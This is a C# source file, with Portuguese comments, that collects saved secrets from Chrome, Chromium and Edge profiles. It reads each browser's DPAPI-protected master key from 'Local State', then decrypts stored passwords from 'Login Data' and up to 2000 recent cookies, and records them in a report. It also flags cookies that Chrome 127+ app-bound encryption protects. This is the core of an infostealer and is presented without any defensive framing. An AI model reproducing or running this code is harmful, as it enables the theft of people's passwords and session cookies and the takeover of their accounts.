using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Teste.Core;
using Teste.Native;

namespace Teste.Collect;

public sealed class SecretRec
{
    public string Source { get; set; } = "";
    public string Kind { get; set; } = "";        // senha | cookie | cartao | autofill
    public string Key { get; set; } = "";
    public string User { get; set; } = "";
    public string? Value { get; set; }
    public string Status { get; set; } = "ok";    // ok | app_bound | dpapi | indecifrado | empty
    public string? Extra { get; set; }
}

public static class ChromeCollector
{
    public static void Collect(Report r, Logger log)
    {
        foreach (var b in Browsers.Find())
        {
            byte[] key;
            try { key = Browsers.MasterKey(b.Root); }
            catch (Exception ex) { r.Errors.Add(new ErrorRec($"{b.Name}:chave", ex.Message)); continue; }

            foreach (var profile in Browsers.Profiles(b.Root))
            {
                var tag = $"{b.Name}/{Path.GetFileName(profile)}";
                try { Logins(r, tag, profile, key); } catch (Exception ex) { r.Errors.Add(new ErrorRec(tag + ":senhas", ex.Message)); }
                try { Cookies(r, tag, profile, key); } catch (Exception ex) { r.Errors.Add(new ErrorRec(tag + ":cookies", ex.Message)); }
            }
        }
    }

    private static void Logins(Report r, string tag, string profile, byte[] key)
    {
        var db = Path.Combine(profile, "Login Data");
        if (!File.Exists(db)) return;

        using var snap = new DbSnapshot(db);
        using var cmd = snap.Conn.CreateCommand();
        cmd.CommandText = "SELECT origin_url, username_value, password_value, times_used FROM logins";
        using var rd = cmd.ExecuteReader();
        while (rd.Read())
        {
            var (value, status) = Open((byte[])rd[2], key, null);
            r.Secrets.Add(new SecretRec
            {
                Source = tag, Kind = "senha", Key = rd.GetString(0), User = rd.GetString(1),
                Value = value, Status = status, Extra = rd.IsDBNull(3) ? null : rd.GetInt32(3).ToString()
            });
        }
    }

    private static void Cookies(Report r, string tag, string profile, byte[] key)
    {
        var db = Path.Combine(profile, "Cookies");
        if (!File.Exists(db)) return;

        using var snap = new DbSnapshot(db);
        using var cmd = snap.Conn.CreateCommand();
        cmd.CommandText = "SELECT host_key, name, encrypted_value, is_secure FROM cookies ORDER BY last_access_utc DESC LIMIT 2000";
        using var rd = cmd.ExecuteReader();
        while (rd.Read())
        {
            var host = rd.GetString(0);
            var (value, status) = Open((byte[])rd[2], key, host);
            r.Secrets.Add(new SecretRec
            {
                Source = tag, Kind = "cookie", Key = $"{host}\t{rd.GetString(1)}",
                Value = string.IsNullOrEmpty(value) ? null : value, Status = status,
                Extra = (!rd.IsDBNull(3) && rd.GetInt64(3) == 1) ? "secure" : null
            });
        }
    }

    private static (string?, string) Open(byte[] blob, byte[] key, string? hostKey)
    {
        if (blob.Length == 0) return (null, "empty");
        var ver = Encoding.ASCII.GetString(blob, 0, Math.Min(3, blob.Length));

        if (ver is "v10" or "v11")
        {
            try
            {
                var pt = Crypto.OpenKeyed(key, blob);
                if (hostKey != null) pt = Crypto.StripHostPrefix(pt, hostKey);
                return (Fix(Encoding.UTF8.GetString(pt)), "ok");
            }
            catch (CryptographicException)
            {
                return (null, "app_bound");   // Chrome >= 127 protege cookie pelo servico de elevacao
            }
        }

        try { return (Fix(Encoding.UTF8.GetString(Dpapi.Unprotect(blob))), "dpapi"); }
        catch { return (null, "indecifrado"); }
    }

    private static string Fix(string s)
    {
        if (s.Length > 1 && s[0] == '\u0001' && s.Skip(1).All(c => !char.IsControl(c))) return s[1..];
        return s.TrimEnd('\0');
    }
}

public static class Browsers
{
    private static readonly string[] Names =
        { "Google Chrome", "Google Chrome Beta", "Google Chrome Dev", "Chromium", "Microsoft Edge" };

    private static readonly Dictionary<string, byte[]> KeyCache = new();

    public static IEnumerable<(string Name, string Root)> Find()
    {
        var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        foreach (var n in Names)
        {
            var root = Path.Combine(local, n, "User Data");
            if (Directory.Exists(root)) yield return (n, root);
        }
    }

    public static IEnumerable<string> Profiles(string root)
    {
        var def = Path.Combine(root, "Default");
        if (Directory.Exists(def)) yield return def;
        foreach (var d in Directory.EnumerateDirectories(root))
            if (Path.GetFileName(d).StartsWith("Profile ", StringComparison.OrdinalIgnoreCase)) yield return d;
    }

    public static byte[] MasterKey(string userDataRoot)
    {
        if (KeyCache.TryGetValue(userDataRoot, out var cached)) return cached;

        using var doc = JsonDocument.Parse(Files.ReadAllText(Path.Combine(userDataRoot, "Local State")));
        var b64 = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString()
                  ?? throw new InvalidOperationException("os_crypt.encrypted_key ausente");
        var blob = Convert.FromBase64String(b64);
        if (Encoding.ASCII.GetString(blob[..5]) != "DPAPI") throw new InvalidOperationException("sem prefixo DPAPI");

        var key = Dpapi.Unprotect(blob[5..]);
        KeyCache[userDataRoot] = key;
        return key;
    }
}